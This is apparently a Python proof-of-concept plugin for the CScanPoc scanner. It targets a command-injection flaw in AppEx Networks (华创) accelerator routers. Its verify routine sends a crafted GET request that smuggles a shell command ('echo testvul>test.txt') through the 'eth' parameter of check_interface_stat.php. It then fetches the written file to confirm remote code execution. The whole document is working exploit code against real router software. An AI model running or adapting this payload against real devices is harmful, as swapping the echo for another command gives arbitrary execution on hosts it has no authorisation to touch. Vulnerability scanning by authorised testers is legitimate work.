# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urlparse

class Vuln(ABVuln):
    vuln_id = 'AppExNetworks_0005' # 平台漏洞编号，留空
    name = '华创路由器 命令执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE # 漏洞类型
    disclosure_date = 'Unknown'  # 漏洞公布时间
    desc = '''
        华创智能加速路由器，设计缺陷。
        函数未做完整过滤，导致可上传任意文件，进而执行任意命令。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '华创路由器'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '72170180-07d6-41ca-b6c5-b74dd1d36d13'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-10'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            payload = '/acc/network/interface/check_interface_stat.php?eth=a|%20echo%20testvul>test.txt%20||'
            verify_url = self.target + payload
            r = requests.get(verify_url)

            if r.status_code == 200:
                r = requests.get(self.target + '/acc/network/interface/test.txt')
                if r.status_code == 200 and 'testvul' in r.content:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
